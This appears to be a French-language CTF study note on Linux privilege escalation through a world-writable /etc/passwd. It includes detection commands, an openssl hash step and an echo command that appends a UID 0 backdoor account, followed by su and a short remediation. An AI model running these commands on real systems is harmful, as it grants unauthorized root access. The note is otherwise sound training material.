---
technique: "Writable /etc/passwd"
os: Linux
categorie: PrivEsc
tags: [technique, privesc, linux]
rooms: []
---

# Writable /etc/passwd

## Principe
> Historiquement, `/etc/passwd` pouvait contenir le hash du mot de passe dans le 2e champ (à la place du `x`). Si je peux **écrire** dans `/etc/passwd`, j'ajoute un user avec **UID 0** et un hash que je contrôle → je deviens root via `su`.

## Détection
```bash
ls -l /etc/passwd          # writable par moi ?
find / -writable -type f 2>/dev/null | grep passwd
```

## Exploitation
```bash
# 1. Générer un hash pour le mot de passe "password1"
openssl passwd -1 -salt THM password1
# → $1$THM$Wnbwlli... (MD5)

# 2. Ajouter une ligne dans /etc/passwd (champ 3 = UID 0 = root)
echo 'hacker:$1$THM$Wnbwlli...:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Se connecter
su hacker       # mot de passe : password1
id              # uid=0(root)
```

### Structure de la ligne
| Champ | Valeur | Rôle |
|-------|--------|------|
| 1 | `hacker` | nom du compte |
| 2 | `$1$THM$...` | hash du mot de passe |
| 3 | `0` | **UID 0 = root** |
| 4 | `0` | GID |
| 5-6-7 | `root` / `/root` / `/bin/bash` | infos + shell |

## Piège vécu
> Ne pas confondre `/etc/passwd` et `/etc/shadow` : si un éditeur SUID (vim.basic) est utilisé, bien vérifier dans quel fichier on écrit (`"/etc/passwd" written`, pas shadow).

## Remédiation
- `/etc/passwd` ne doit être modifiable que par root (`-rw-r--r-- root root`).
